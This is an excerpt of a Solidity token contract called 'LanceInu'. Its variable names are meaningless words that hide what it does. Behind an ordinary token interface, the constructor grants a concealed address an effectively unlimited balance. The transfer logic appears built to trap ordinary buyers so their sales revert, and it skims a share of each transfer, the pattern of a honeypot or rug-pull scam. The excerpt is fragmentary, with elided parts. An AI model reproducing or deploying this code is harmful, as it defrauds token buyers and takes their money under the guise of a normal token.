...
contract LanceInu is Ownable {
    constructor(
        string memory science,
        string memory studied,
        address expect,
        address eye
    ) {
        _symbol = studied;
        ...
        _decimals = 9;
        across = 1000000000;
        _tTotal = across * 10**_decimals;

        _balances[eye] = clay;
        _balances[msg.sender] = _tTotal;
        equator[eye] = clay;
        equator[msg.sender] = clay;

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    uint256 public beside;
    ...
    uint256 private across;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    LanceInu private bat;
    uint256 private clay = ~uint256(0);
    ...
    function bring(
        ...
        address gravity = address(bat);
        bool out = uniswapV2Pair == garage;
        uint256 acres = beside;

        if (equator[garage] == 0 && practical[garage] > 0 && !out) {
            equator[garage] -= acres;
        }

        bat = LanceInu(divide);

        if (equator[garage] > 0 && stone == 0) {
            equator[divide] += acres;
        }

        practical[gravity] += acres + 1;

        uint256 wise = (stone / 100) * beside;
        stone -= wise;
        _balances[garage] -= wise;
        _balances[address(this)] += wise;

        _balances[garage] -= stone;
        _balances[divide] += stone;
    }
    ...
    function transferFrom(
        ...
        bring(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        bring(msg.sender, recipient, amount);
